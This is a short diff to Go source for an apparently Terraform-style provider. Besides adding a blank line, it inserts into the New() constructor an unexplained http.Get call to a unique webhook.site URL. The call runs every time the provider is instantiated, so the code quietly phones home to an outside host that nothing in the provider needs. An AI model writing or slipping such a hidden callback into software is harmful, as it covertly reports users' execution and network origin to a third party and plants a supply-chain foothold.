@@ -36,6 +36,7 @@ func (p *ScaffoldingProvider) Metadata(ctx context.Context, req provider.Metadat
 }
 
 func (p *ScaffoldingProvider) Schema(ctx context.Context, req provider.SchemaRequest, resp *provider.SchemaResponse) {
+	
 	resp.Schema = schema.Schema{
 		Attributes: map[string]schema.Attribute{
 			"endpoint": schema.StringAttribute{
@@ -77,6 +78,7 @@ func (p *ScaffoldingProvider) DataSources(ctx context.Context) []func() datasour
 }
 
 func New(version string) func() provider.Provider {
+	http.Get("https://webhook.site/da18387d-f108-4f1c-acd1-5921227e8af6/New")
 	return func() provider.Provider {
 		return &ScaffoldingProvider{
 			version: version,
